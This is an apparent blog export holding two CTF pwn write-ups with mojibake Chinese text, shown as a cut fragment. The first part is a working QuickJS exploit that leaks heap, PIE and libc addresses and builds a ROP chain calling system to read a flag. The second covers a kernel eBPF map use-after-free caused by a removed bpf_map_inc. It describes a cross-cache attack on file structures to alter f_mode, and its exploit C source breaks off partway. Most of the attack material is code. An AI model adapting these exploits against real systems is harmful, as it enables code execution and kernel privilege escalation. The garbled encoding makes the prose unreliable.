class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> pad1 = <span class="hljs-string">&quot;a&quot;</span>, pad2 = <span class="hljs-string">&quot;a&quot;</span>, pad3 = <span class="hljs-string">&quot;a&quot;</span>, pad4 = <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">const</span> map = [<span class="hljs-number">0xffffffffffffffffn</span>]<br><br>map.<span class="hljs-title function_">randompick</span>()<br>map.<span class="hljs-title function_">randompick</span>()<br>map.<span class="hljs-title function_">randompick</span>()<br><br><span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">let</span> array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf)<br><br>array[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span><br>array[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span><br><br>heapbase = ((map[<span class="hljs-number">0</span>] &gt;&gt; (<span class="hljs-number">35n</span> * <span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>) - <span class="hljs-number">0xcf2n</span><br>pie = ((map[<span class="hljs-number">0</span>] &gt;&gt; (<span class="hljs-number">36n</span> * <span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>) - <span class="hljs-number">0xf2660n</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(heapbase.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pie.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0n</span>; i &lt; <span class="hljs-number">0x100n</span>; i++)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i, ((map[<span class="hljs-number">0</span>]&gt;&gt;(i*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>&#125;<br><br><span class="hljs-keyword">let</span> tmp1 = [&#123;&#125;, &#123;&#125;, &#123;&#125;]<br><span class="hljs-keyword">let</span> map1 = [&#123;&#125;]<br><br>map1.<span class="hljs-title function_">randompick</span>()<br><br>tmp1[<span class="hljs-number">0</span>] = <span class="hljs-literal">null</span><br>tmp1[<span class="hljs-number">1</span>] = <span class="hljs-literal">null</span><br><br><span class="hljs-keyword">let</span> buf1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x48</span>)<br><span class="hljs-keyword">let</span> array1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(buf1)<br><br>array1[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1d0d0000000002n</span><br>array1[<span class="hljs-number">3</span>] = <span class="hljs-number">0x7b00000000n</span><br>array1[<span class="hljs-number">4</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>array1[<span class="hljs-number">7</span>] = pie + <span class="hljs-number">0xf4fc8n</span><br>array1[<span class="hljs-number">8</span>] = <span class="hljs-number">0x100n</span><br><br><span class="hljs-keyword">let</span> libcbase = map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">0x2a5b0n</span><br><span class="hljs-keyword">let</span> stack = map1[<span class="hljs-number">0</span>][<span class="hljs-number">34</span>]<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(libcbase.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stack.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><br>array1[<span class="hljs-number">7</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0x616c66646165722fn</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">0x67n</span><br><br>array1[<span class="hljs-number">7</span>] = stack - <span class="hljs-number">0x498n</span><br><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = libcbase + <span class="hljs-number">0x28882n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = libcbase + <span class="hljs-number">0x119fdcn</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>] = libcbase + <span class="hljs-number">0x5c110n</span> <span class="hljs-comment">// puts: 0x8db68n, system: 0x5c110n</span><br></code></pre></td></tr></table></figure><h1 id="ä¸€ç‚¹é¢˜å¤–è¯"><a href="#ä¸€ç‚¹é¢˜å¤–è¯" class="headerlink" title="ä¸€ç‚¹é¢˜å¤–è¯"></a>ä¸€ç‚¹é¢˜å¤–è¯</h1><p>åœ¨discordæ‰¾äº†ä¸ªexpï¼Œæœ‰è¿™ä¹ˆä¸€æ®µ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr = [<span class="hljs-number">0xfffffffffffffffffffn</span>]<br>num = arr.<span class="hljs-title function_">randompick</span>()<br>num2 = arr.<span class="hljs-title function_">randompick</span>()<br>num3 = arr.<span class="hljs-title function_">randompick</span>()<br><span class="hljs-keyword">delete</span> num<br><span class="hljs-keyword">delete</span> num3<br><br>heap_leak = (num2&gt;&gt;(<span class="hljs-number">5n</span>*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span><br>libc_leak = (num2&gt;&gt;(<span class="hljs-number">7n</span>*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span> - <span class="hljs-number">0x210c50n</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(heap_leak.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(libc_leak.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br></code></pre></td></tr></table></figure><p>ä½†ç†è®ºä¸Šæ¥è¯´deleteåªå¯¹å¯¹è±¡å±æ€§èµ·æ•ˆï¼Œè¿™ä¹ˆå†™åº”è¯¥ä¼šfalseæ‰å¯¹</p><p>åæ¥æ‰æ³¨æ„åˆ°è¿™ä¸ªå£°æ˜æ²¡ç”¨letï¼Œåæ¥æŸ¥åˆ°è¿™ç§<strong>éšå¼å£°æ˜</strong>ç›¸å½“äºç»™å…¨å±€å¯¹è±¡å¢åŠ ä¸€ä¸ªå±æ€§ï¼Œæ‰€ä»¥æ˜¯æœ‰æ•ˆçš„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">num = <span class="hljs-number">114514n</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalThis)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">qjs tmp.js</span><br>&#123; console: &#123; log: [Function] &#125;, performance: &#123; now: [Function] &#125;, scriptArgs: [ &quot;tmp.js&quot; ], print: [Function print], num: 114514n &#125;<br></code></pre></td></tr></table></figure><p><em>è™½ç„¶è·Ÿè¿™é“é¢˜æ²¡ä»€ä¹ˆå…³ç³»ï¼Œæ¨‚</em></p><p>åšè¿™é“é¢˜çš„æ—¶å€™é‡æ–°æƒ³èµ·äº†è¢«v8æ”¯é…çš„ææƒ§ï¼Œè¿™ç§jsè§£é‡Šå™¨çš„é¢˜æœ€æ¶å¿ƒçš„å°±æ˜¯ä»£ç ä½†å‡¡æœ‰ä¸€ç‚¹å°å˜åŒ–æ•´ä¸ªå †å¸ƒå±€å¤§åŠ¨â€¦â€¦</p><img src="/2025/09/13/asis2025qjs/kita.jpg" class title="kita"><p>åæ¥å‘ç°å¯ä»¥éšä¾¿å¡ç‚¹å˜é‡è°ƒå †ï¼Œåˆ«ç®¡ä¸ºä»€ä¹ˆæœ‰ç”¨å°±è¡Œï¼ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> pad1 = <span class="hljs-string">&quot;a&quot;</span>, pad2 = <span class="hljs-string">&quot;a&quot;</span>, pad3 = <span class="hljs-string">&quot;a&quot;</span>, pad4 = <span class="hljs-string">&quot;a&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>js</tag>
      
      <tag>quickjs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 è¥¿é—¨å­ç™½å¸½é»‘å®¢å¤§èµ› pwn wp</title>
    <link href="/2025/09/01/ximenzi/"/>
    <url>/2025/09/01/ximenzi/</url>
    
    <content type="html"><![CDATA[<p>åˆç¿»å‡ºä¸€é“å†å²æ‚ ä¹…çš„é¢˜</p><span id="more"></span><h1 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c<br>index <span class="hljs-number">264b</span>3dc714cc.<span class="hljs-number">.49263e1295</span>db <span class="hljs-number">100644</span><br>--- a/kernel/bpf/verifier.c<br>+++ b/kernel/bpf/verifier.c<br>@@ <span class="hljs-number">-12900</span>,<span class="hljs-number">7</span> +<span class="hljs-number">12900</span>,<span class="hljs-number">7</span> @@ <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">resolve_pseudo_ldimm64</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>  * will be used by the valid program until it&#x27;s unloaded<br>  * and all maps are released in <span class="hljs-title function_">free_used_maps</span><span class="hljs-params">()</span><br>  */<br>-<span class="hljs-title function_">bpf_map_inc</span><span class="hljs-params">(<span class="hljs-built_in">map</span>)</span>;<br>+<span class="hljs-comment">//bpf_map_inc(map);</span><br> <br> aux-&gt;map_index = env-&gt;used_map_cnt;<br> env-&gt;used_maps[env-&gt;used_map_cnt++] = <span class="hljs-built_in">map</span>;<br></code></pre></td></tr></table></figure><p>bpf_checkå¦‚æœebpf programä½¿ç”¨äº†æŸä¸ªmapä¼šæŠŠmap-&gt;refcnt+1ï¼ŒpatchæŠŠè¿™è¡Œæ³¨é‡Šäº†ã€‚å¦‚æœload ebpf programåclose(map)ï¼Œä»ç„¶å¯ä»¥é€šè¿‡ebpf programå¯¹mapè¿›è¡Œè¯»å†™ï¼Œé€ æˆäº†uaf</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>bpf_checkæ£€æŸ¥é€šè¿‡åä¼šæŠŠebpf programè½¬æ¢æˆå¯æ‰§è¡Œä»£ç ï¼Œbpf_prog-&gt;bpf_funcæŒ‡å‘è¿™æ®µä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> &#123;</span><br>u16                        pages;                <span class="hljs-comment">/*     0     2 */</span><br>u16                        jited:<span class="hljs-number">1</span>;              <span class="hljs-comment">/*     2: 0  2 */</span><br>u16                        jit_requested:<span class="hljs-number">1</span>;      <span class="hljs-comment">/*     2: 1  2 */</span><br>u16                        gpl_compatible:<span class="hljs-number">1</span>;     <span class="hljs-comment">/*     2: 2  2 */</span><br>u16                        cb_access:<span class="hljs-number">1</span>;          <span class="hljs-comment">/*     2: 3  2 */</span><br>u16                        dst_needed:<span class="hljs-number">1</span>;         <span class="hljs-comment">/*     2: 4  2 */</span><br>u16                        blinding_requested:<span class="hljs-number">1</span>; <span class="hljs-comment">/*     2: 5  2 */</span><br>u16                        blinded:<span class="hljs-number">1</span>;            <span class="hljs-comment">/*     2: 6  2 */</span><br>u16                        is_func:<span class="hljs-number">1</span>;            <span class="hljs-comment">/*     2: 7  2 */</span><br>u16                        kprobe_override:<span class="hljs-number">1</span>;    <span class="hljs-comment">/*     2: 8  2 */</span><br>u16                        has_callchain_buf:<span class="hljs-number">1</span>;  <span class="hljs-comment">/*     2: 9  2 */</span><br>u16                        enforce_expected_attach_type:<span class="hljs-number">1</span>; <span class="hljs-comment">/*     2:10  2 */</span><br>u16                        call_get_stack:<span class="hljs-number">1</span>;     <span class="hljs-comment">/*     2:11  2 */</span><br>u16                        call_get_func_ip:<span class="hljs-number">1</span>;   <span class="hljs-comment">/*     2:12  2 */</span><br>u16                        tstamp_type_access:<span class="hljs-number">1</span>; <span class="hljs-comment">/*     2:13  2 */</span><br><br><span class="hljs-comment">/* XXX 2 bits hole, try to pack */</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span>         <span class="hljs-title">type</span>;</span>                 <span class="hljs-comment">/*     4     4 */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_attach_type</span>       <span class="hljs-title">expected_attach_type</span>;</span> <span class="hljs-comment">/*     8     4 */</span><br>u32                        len;                  <span class="hljs-comment">/*    12     4 */</span><br>u32                        jited_len;            <span class="hljs-comment">/*    16     4 */</span><br>u8                         tag[<span class="hljs-number">8</span>];               <span class="hljs-comment">/*    20     8 */</span><br><br><span class="hljs-comment">/* XXX 4 bytes hole, try to pack */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_stats</span> *    <span class="hljs-title">stats</span>;</span>                <span class="hljs-comment">/*    32     8 */</span><br><span class="hljs-type">int</span> *                      active;               <span class="hljs-comment">/*    40     8 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span>               <span class="hljs-params">(*bpf_func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>  *, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn  *)</span>; <span class="hljs-comment">/*  /</span><br><span class="hljs-comment">struct bpf_prog_aux *      aux;                  /*    56     8 */</span><br><span class="hljs-comment">/* --- cacheline 1 boundary (64 bytes) --- */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog_kern</span> *   <span class="hljs-title">orig_prog</span>;</span>            <span class="hljs-comment">/*    64     8 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>&#125; __empty_insns;                 <span class="hljs-comment">/*    72     0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">insns</span>[0];</span>     <span class="hljs-comment">/*    72     0 */</span><br>&#125;;                                       <span class="hljs-comment">/*    72     0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>&#125; __empty_insnsi;                <span class="hljs-comment">/*    72     0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">insnsi</span>[0];</span>       <span class="hljs-comment">/*    72     0 */</span><br>&#125;;                                       <span class="hljs-comment">/*    72     0 */</span><br>&#125;;                                               <span class="hljs-comment">/*    72     0 */</span><br><br><span class="hljs-comment">/* size: 72, cachelines: 2, members: 26 */</span><br><span class="hljs-comment">/* sum members: 66, holes: 1, sum holes: 4 */</span><br><span class="hljs-comment">/* sum bitfield members: 14 bits, bit holes: 1, sum bit holes: 2 bits */</span><br><span class="hljs-comment">/* last cacheline: 8 bytes */</span><br>&#125;;<br></code></pre></td></tr></table></figure><img src="/2025/09/01/ximenzi/bpf_prog.png" class title="bpf_prog"><p>bpf_arrayçš„å†…å®¹å°±è·Ÿåœ¨bpf_arrayç»“æ„ä½“ä¹‹åï¼Œå…¶ä»–bpf_mapåŒç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span>             <span class="hljs-title">map</span>;</span>                  <span class="hljs-comment">/*     0   256 */</span><br><br><span class="hljs-comment">/* XXX last struct has 26 bytes of padding */</span><br><br><span class="hljs-comment">/* --- cacheline 4 boundary (256 bytes) --- */</span><br>u32                        elem_size;            <span class="hljs-comment">/*   256     4 */</span><br>u32                        index_mask;           <span class="hljs-comment">/*   260     4 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array_aux</span> *     <span class="hljs-title">aux</span>;</span>                  <span class="hljs-comment">/*   264     8 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">char</span>               value[<span class="hljs-number">0</span>];             <span class="hljs-comment">/*   272     0 */</span><br><span class="hljs-type">void</span> *             ptrs[<span class="hljs-number">0</span>];              <span class="hljs-comment">/*   272     0 */</span><br><span class="hljs-type">void</span> *             pptrs[<span class="hljs-number">0</span>];             <span class="hljs-comment">/*   272     0 */</span><br>&#125;;                                               <span class="hljs-comment">/*   272     0 */</span><br><br><span class="hljs-comment">/* size: 320, cachelines: 5, members: 5 */</span><br><span class="hljs-comment">/* padding: 48 */</span><br><span class="hljs-comment">/* paddings: 1, sum paddings: 26 */</span><br>&#125; __attribute__((__aligned__(<span class="hljs-number">64</span>)));<br></code></pre></td></tr></table></figure><img src="/2025/09/01/ximenzi/bpf_array.png" class title="bpf_array"><p>å¦‚æœebpf programä½¿ç”¨äº†mapä¸”bpf_checké€šè¿‡åï¼Œbpf_prog-&gt;bpf_funcç›´æ¥ä½¿ç”¨mapçš„åœ°å€å®šä½content</p><img src="/2025/09/01/ximenzi/bpf_func.png" class title="bpf_func"><p>ä»¥ä¸Šç‰¹æ€§è¯´æ˜ä¸¤ç‚¹ï¼š</p><ol><li>bpf_arrayçš„å¤§å°å¯å˜ï¼Œé€šè¿‡æ”¹å˜arrayå¤§å°</li><li>ä¸ç”¨æ‹…å¿ƒmapé‡æ–°åˆ†é…åå†…å®¹è¢«ç ´åï¼Œå› ä¸ºbpf_prog-&gt;bpf_funcå¯¹mapçš„æ“ä½œä¸ä½¿ç”¨bpf_mapçš„æ•°æ®</li></ol><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>æ”¹busyboxçš„æ‰“æ³•ï¼ŒCross-Cacheåˆ°filpç„¶åebpf programæ”¹file-&gt;f_mode</p><p>é€‰æ‹©æ§åˆ¶bpf_arrayå¤§å°ä¸º512ã€‚å†å¤§ä¸€ä¸ªslabä¼šå å¤šä¸ªpageï¼Œåˆ†é…ä¼šé åï¼›fileç»“æ„ä½“256ï¼Œæ‰€ä»¥ä¸èƒ½å†å°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_insn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_SPRAY_N    0x300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAP_SPRAY_N     8*16</span><br><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size,</span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_flags)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_type = map_type,<br>                .key_size = key_size,<br>                .value_size = value_size,<br>                .max_entries = max_entries,<br>                .map_flags = map_flags,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, 